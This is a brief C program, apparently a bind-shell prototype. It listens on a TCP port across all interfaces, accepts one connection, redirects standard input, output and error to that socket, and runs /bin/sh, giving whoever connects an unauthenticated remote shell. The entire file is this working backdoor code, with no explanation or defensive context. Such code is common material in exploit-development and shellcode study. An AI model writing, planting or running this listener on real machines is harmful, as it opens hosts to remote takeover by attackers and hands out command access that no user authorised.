#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>


int main(){
	int sock,newfd;
	struct sockaddr_in srv;

	srv.sin_family = AF_INET;
	srv.sin_port = htons(0xD304); //0xD204
	srv.sin_addr.s_addr=0;
	sock=socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
	bind(sock,(struct sockaddr*)&srv,16);
	listen(sock,0);
	newfd=accept(sock,NULL,NULL);

	for (int i = 0; i < 3; ++i)
	{
		dup2(newfd,i);
	}

	execve("/bin/sh",NULL,NULL);
}